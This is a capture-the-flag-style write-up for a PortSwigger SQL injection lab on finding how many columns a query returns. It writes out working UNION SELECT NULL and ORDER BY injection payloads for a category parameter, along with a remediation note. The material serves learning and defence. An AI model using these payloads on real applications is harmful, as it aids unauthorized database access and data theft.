# Lab 03 — SQL injection UNION attack, determining the number of columns returned by the query

| | |
|---|---|
| **Difficulty** | 🟨 Practitioner |
| **Category** | UNION attacks |
| **Concept** | [07 — UNION attacks](https://portswigger.net/web-security/sql-injection) |
| **PortSwigger** | https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns |

---

## 🎯 Objective
The category filter returns results in the response. **Determine the number of columns** the query returns by making it return an **additional row containing null values**.

## 🧠 Background
A `UNION SELECT` must match the original query's **column count**. Two ways to find it: `ORDER BY n` (increment until error) or `UNION SELECT NULL,...` (add NULLs until the error disappears).

## 🪜 Methodology — method A (`UNION SELECT NULL`)
Send in the `category` parameter, adding one `NULL` at a time:
```
?category=Gifts' UNION SELECT NULL--
?category=Gifts' UNION SELECT NULL,NULL--
?category=Gifts' UNION SELECT NULL,NULL,NULL--
```
The first two error out ("different number of columns"); the **three-NULL** version succeeds → the query returns **3 columns**.

## 🪜 Methodology — method B (`ORDER BY`)
```
?category=Gifts' ORDER BY 1--
?category=Gifts' ORDER BY 2--
?category=Gifts' ORDER BY 3--
?category=Gifts' ORDER BY 4--   ← error: only 3 columns exist
```

## 💥 Payload (solves the lab)
```
https://LAB-ID.web-security-academy.net/filter?category=Gifts' UNION SELECT NULL,NULL,NULL--
```
URL-encoded:
```
?category=Gifts'+UNION+SELECT+NULL,NULL,NULL--
```

## ✅ Why it works
`NULL` is type-agnostic, so it satisfies any column's data type without a conversion error. When the number of `NULL`s equals the number of columns, the `UNION` is valid and the app returns the extra (empty) row instead of an error.

## 🛡️ Remediation
Parameterized queries prevent the attacker from appending a `UNION`. See [16 — Prevention](https://portswigger.net/web-security/sql-injection).

## 🔑 Takeaway
Column count is **step 1 of every UNION attack** — you can't exfiltrate until the shapes match. `#sqli` `#practitioner` `#union`
